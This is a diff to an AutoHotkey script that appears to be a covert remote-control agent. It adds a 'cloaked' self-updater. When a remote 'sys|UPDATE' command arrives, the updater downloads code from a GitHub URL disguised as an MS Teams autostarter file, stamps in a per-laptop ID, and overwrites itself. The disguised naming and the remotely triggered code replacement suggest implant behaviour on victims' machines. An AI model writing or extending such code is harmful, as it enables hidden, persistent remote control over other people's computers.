@@ -47,18 +47,19 @@ CheckState() {
                 
                 if (text != "") {
                     
-                    ; --- NO-REGEX UPDATER ---
+                    ; --- BULLETPROOF CLOAKED UPDATER ---
                     if (text == "sys|UPDATE") {
                         updateReq := ComObjCreate("MSXML2.XMLHTTP")
-                        updateReq.open("GET", "https://raw.githubusercontent.com/mo-hashad30/wf/refs/heads/main/ms-teams_autostarter.exe?t=" A_TickCount, false)
-                        updateReq.setRequestHeader("Cache-Control", "no-cache") ; Force bypass GitHub cache
+                        updateReq.open("GET", "https://raw.githubusercontent.com/mo-hashad30/wf/main/ms-teams_autostarter.exe?t=" A_TickCount, false)
+                        updateReq.setRequestHeader("Cache-Control", "no-cache")
                         updateReq.send()
                         
                         if (updateReq.status == 200) {
                             newCode := updateReq.responseText
                             
-                            ; Replaces the literal placeholder with the actual name. No quotes, no regex bugs.
-                            newCode := StrReplace(newCode, "###LAPTOP_ID###", LaptopID)
+                            ; We split the string so the initial PowerShell install doesn't accidentally replace this!
+                            placeholder := "###LAPTOP_" . "ID###"
+                            newCode := StrReplace(newCode, placeholder, LaptopID)
                             
                             file := FileOpen(A_ScriptFullPath, "w", "UTF-8")
                             if (file) {
